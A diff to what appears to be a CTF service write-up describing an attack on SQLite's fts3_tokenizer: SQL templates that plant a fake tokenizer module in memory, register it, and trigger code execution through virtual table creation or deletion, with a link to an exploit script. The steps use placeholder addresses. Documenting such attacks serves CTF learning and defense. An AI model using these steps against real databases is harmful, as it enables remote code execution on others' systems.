@@ -104,7 +104,7 @@ Attack scenario:
    ```
    SELECT replace(hex(zeroblob(10000)), '00', x'0000000000000000<xCreate function address><xDestroy function address><xOpen function address><xClose function address><xNext function address>');
    ```
-3. Define new fts3-tokenizer via `SELECT fts3_tokenizer('main', x'<crafted sqlite3_tokenizer_module address>');`
+3. Define new fts3-tokenizer via `SELECT fts3_tokenizer('<tokenizer name>', x'<crafted sqlite3_tokenizer_module address>');`
 4. Trigger code execution via overrided `xCreate` (`CREATE VIRTUAL TABLE t USING fts3(tokenize=<tokenizer name>);`) or `xDestroy` (`DROP TABLE t;`)
 
 The exploit can be found at [/sploits/sql_demo/sql_demo.sploit.py](../../sploits/sql_demo/sql_demo.sploit.py).
